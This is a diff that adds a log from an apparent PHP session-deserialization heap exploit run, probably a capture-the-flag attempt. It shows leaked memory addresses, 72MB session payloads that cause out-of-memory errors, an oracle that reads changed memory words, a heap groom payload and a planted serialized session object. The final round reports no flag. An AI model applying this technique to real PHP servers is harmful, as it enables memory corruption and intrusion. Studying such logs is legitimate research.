@@ -1,0 +1,23 @@
+[2026-10-21 23:30:36] === round r1: cpid=2939079 bias=0xfa2f10be0000 basic_globals=0xfa2f11afe748
+[2026-10-21 23:30:48] === round r1: cpid=2939079 bias=0xfa2f10be0000 basic_globals=0xfa2f11afe748
+[2026-10-21 23:30:48] baseline read: 6 children [53, 54, 55, 56, 57, 69]
+[2026-10-21 23:30:48] staged producer session sess_a233048aaaaaaaaaaaaaaaaaaaaaaaaa (72MB) + consumer sid ready
+[2026-10-21 23:30:53] producer: t=5.1s oom_signature=False len=69110
+[2026-10-21 23:30:53] producer body: 584a <br /> <b>Warning</b>:  PHP Request Startup: Failed to decode session object. Session has been destroyed in <b>Unknown</b> on line <b>0</b><br /> <br /> <b>Warning</b>:  PHP Request Startup: Fai
+[2026-10-21 23:30:53] ORACLE: expected exactly 1 changed qword, got [(57, 275080067148128, 165422502), (57, 275080067148168, 611), (57, 275080067148200, 388231953), (57, 275080067148208, 1760506831), (57, 275080067148232, 353225655), (57, 275080067148248, 1048613), (57, 275080067148256, 165422504), (57, 275080067148264, 4295000484), (57, 275080067148272, 141733920801), (57, 275080067148296, 2336), (57, 275080067148304, 4096), (57, 275080067148312, 8), (57, 275080067148320, 1792647682), (57, 275080067148328, 388231953), (57, 275080067148336, 1732283418), (57, 275080067148352, 1792647681), (57, 275080067148360, 353225655)]
+[2026-10-21 23:33:08] === round r2: cpid=2939079 bias=0xfa2f10be0000 basic_globals=0xfa2f11afe748
+[2026-10-21 23:33:08] baseline read: 6 children [53, 54, 55, 56, 57, 69]
+[2026-10-21 23:33:08] staged producer session sess_a233308aaaaaaaaaaaaaaaaaaaaaaaaa (72MB) + consumer sid ready
+[2026-10-21 23:33:08] producer: t=0.0s oom_signature=True len=553
+[2026-10-21 23:33:08] producer body: <br /> <b>Fatal error</b>:  Allowed memory size of 134217728 bytes exhausted (tried to allocate 72000032 bytes) in <b>Unknown</b> on line <b>0</b><br /> <br /> <b>Warning</b>:  PHP Request Startup: Fa
+[2026-10-21 23:33:08] ORACLE: expected exactly 1 changed qword, got [(54, 275080067148408, 275080016207872), (54, 275080067148416, 1)]
+[2026-10-21 23:33:19] === round r3: cpid=2939079 bias=0xfa2f10be0000 basic_globals=0xfa2f11afe748
+[2026-10-21 23:33:19] baseline read: 6 children [53, 54, 55, 56, 57, 69]
+[2026-10-21 23:33:19] staged producer session sess_a233319aaaaaaaaaaaaaaaaaaaaaaaaa (72MB) + consumer sid ready
+[2026-10-21 23:33:19] producer: t=0.0s oom_signature=True len=553
+[2026-10-21 23:33:19] producer body: <br /> <b>Fatal error</b>:  Allowed memory size of 134217728 bytes exhausted (tried to allocate 72000032 bytes) in <b>Unknown</b> on line <b>0</b><br /> <br /> <b>Warning</b>:  PHP Request Startup: Fa
+[2026-10-21 23:33:19] ORACLE: child=55 &BG(unserialize).data=0xfa2f11afea78 d_chunk=0xfa2f0ea6a000
+[2026-10-21 23:33:19] groom payload built: 8192B, LG=0xfa2f0ea6b000
+[2026-10-21 23:33:19] staged consumer session sess_b233319bbbbbbbbbbbbbbbbbbbbbbbbb: poc|O:9:Exception:0:{}
+[2026-10-21 23:33:19] consumer: t=0.2s len=6 FLAG=no
+[2026-10-21 23:33:19] consumer body:  <EOF>
